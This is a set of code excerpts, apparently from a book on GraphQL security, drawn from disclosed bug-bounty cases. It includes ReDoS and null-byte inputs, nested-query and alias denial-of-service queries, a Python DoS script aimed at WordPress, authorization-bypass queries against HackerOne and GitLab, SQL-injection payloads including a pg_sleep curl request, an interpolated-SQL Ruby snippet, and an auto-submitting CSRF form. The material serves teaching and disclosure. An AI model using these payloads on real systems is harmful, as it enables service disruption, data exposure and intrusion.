["```\n`--snip--`\nmutation ($eligible_for_submission: Boolean, $instruction: String)\n{\n  createStructuredScope(input: {$eligible_for_submission, instruction: **$instruction**})\n    {\n `--snip--`\n    }\n}\n`--snip--`\n```", "```\nquery {\n  search(q: \"**\\u0000)**\", lang: \"en\") {\n `--snip--`\n}\n```", "```\n\"errors\": [\n    {\n      \"message\": \"value (?=.***\\u0000**) must not contain null bytes\"\n `--snip--`\n    }\n]\n```", "```\n\"extensions\": {\n    \"tracing\": {\n      \"startTime\": \"02:07:55.251\",\n      \"endTime\": \"02:07:55.516\",\n      \"duration\": 264270190,\n `--snip--`\n    }\n}\n```", "```\nquery {\n  search(q: \"**[a-zA-Z0-9]+\\\\s?)+$|^([a-zA-Z0-9.'\\\\w\\\\W]+\\\\s?)+$\\\\**\", lang: \"en\"){\n `--snip--`\n }\n}\n```", "```\nquery {\n  __schema {\n    types {\n      fields {\n        type {\n          fields {\n            type {\n `--snip--`\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```", "```\nquery {\n  alias1: countries {\n     full_name_english\n     full_name_english # continues 1000s of times\n `--snip--`\n  }\n  alias2: countries {\n `--snip--`\n  }\n alias3: countries {\n `--snip--`\n  }\n}\n```", "```\n`--snip--`\nFORCE_MULTIPLIER = int(sys.argv[2])\nCHAINED_REQUESTS = int(sys.argv[3])\n\n`--snip--`\nqueries = []\n\npayload = 'content \\n comments { \\n nodes { \\n content } }' * FORCE_MULTIPLIER\nquery = {'query':'query { \\n posts { \\n nodes { \\n ' + payload + '} } }'}\n\nfor _ in range(0, CHAINED_REQUESTS):\n  queries.append(query)\n\nr = requests.post(WORDPRESS_URL, json=queries)\nprint('Time took: {}'.format(r.elapsed.total_seconds()))\n```", "```\nquery Introspection {\n  __schema {\n    directives {\n      name\n    }\n  }\n}\n```", "```\nquery CircularFragment {\n  __schema {\n❶ ...A\n  }\n}\n\nfragment A on __Schema {\n  directives {\n    name\n  }\n❷ ...B\n}\n\nfragment B on __Schema {\n❸ ...A\n}\n```", "```\nmutation {\n    labelCreate(input:{title:\"deactivated\", projectPath:\"test1/test1\"}){\n        errors\n        label {\n            id\n        }\n    }\n}\n```", "```\nmutation emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!) {\n    emailSenderConfigurationUpdate(input:$input) {\n        emailSenderConfiguration {\n            id\n        }\n        userErrors {\n            field\n            message\n        }\n    }\n }\n```", "```\nquery {\n    team(handle:\"security\"){\n        id\n        name\n        handle\n        whitelisted_hackers {\n            total_count\n        }\n    }\n}\n```", "```\n`--snip--`\n\"team\":{\n    \"id\":\"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=\",\n    \"name\":\"HackerOne\",\n    \"handle\":\"security\",\n    \"whitelisted_hackers\":{\n        **\"total_count\":30**\n    }\n}\n`--snip--`\n```", "```\nquery {\n  project(fullPath:\"username16/ci-test\"){\n    issue(iid:\"1\"){\n      descriptionHtml\n      notes {\n        edges {\n          node {\n            bodyHtml\n            system\n            author {\n              username\n            }\n            body\n          }\n        }\n      }\n    }\n   }\n  }\n```", "```\nquery ($handle_0: String!, $size_1: ProfilePictureSizes!) {\n  team(handle: $handle_0) {\n    id\n    name\n    about\n    profile_picture(size: $size_1)\n    offers_swag\n    offers_bounties\n    base_bounty\n    **payment_transactions** {\n      **total_count**\n    }\n   }\n  }\n}\n```", "```\nquery {\n  users {\n    nodes {\n      id\n      name\n      username\n    }\n  }\n}\n```", "```\n{\"type\":\"start\",\"payload\":{\"query\":\"query Introspection { __schema {...} }\"}}\n```", "```\n/graphql?**embedded_submission_form_uuid**=value\n```", "```\nunless database_parameters_up_to_date\n  safe_query = ''\n\n❶ new_parameters = {\"embedded_submission_form_uuid\":\"PAYLOAD\"}\n\n  new_parameters.each ❷ do |key, value|\n      safe_query += \"SET SESSION #{key} TO #{value};\"\n  end\n\n  begin\n      # safe_query =\"SET SESSION embedded_submission_form_uuid TO PAYLOAD\"\n      connection.query(safe_query)\n  rescue ActiveRecord::StatementInvalid => e\n      raise e unless e.cause.is_a? PG::InFailedSqlTransaction\n  end\n\nend\n```", "```\ntime curl -X POST https://hackerone.com/graphql\\?embedded_submission_form_uuid\\=\n1%27%3BSELECT%201%3BSELECT%20**pg_sleep**\\(**10**\\)%3B--%27\n\n0.02s user 0.01s system 0% cpu **10**.557 total\n```", "```\n/graphql?embedded_submission_form_uuid=**1';SELECT 1;SELECT pg_sleep\\(10\\);--'**\n```", "```\nquery SQLi($d: Duration!) {\n  getLinearIntValues(metric:\n{name: \"all_p99\", id: \"**') UNION SELECT 1,CONCAT('~','9999999999','~')--**\"},\nduration: $d) {\n    values {\n      value\n    }\n  }\n}\n```", "```\nclass **UserObject**(SQLAlchemyObjectType):\n  class Meta:\n    **name = \"MyMaliciousTypeName\"**\n    model = User\n```", "```\n`--snip--`\n<form action=\"https://gitlab.com/api/graphql/\" id=\"csrf-form\" method=\"GET\"> ❶\n<input name= ❷ \"query\" value=\"mutation CreateSnippet($input: CreateSnippetInput!) `--snip--`\">\n<input name= ❸ \"variables\" value='{\"input\":{\"title\":\"Tesssst Snippet\"} `--snip--`'>\n</form>\n`--snip--`\n<script>document.getElementById(\"csrf-form\").submit()</script> ❹\n```", "```\nmutation CreateSnippet($input: CreateSnippetInput!) {\n  createSnippet(input: $input) {\n    errors\n    snippet {\n      webUrl\n      __typename\n    }\n `--snip--`\n  }\n}\n```"]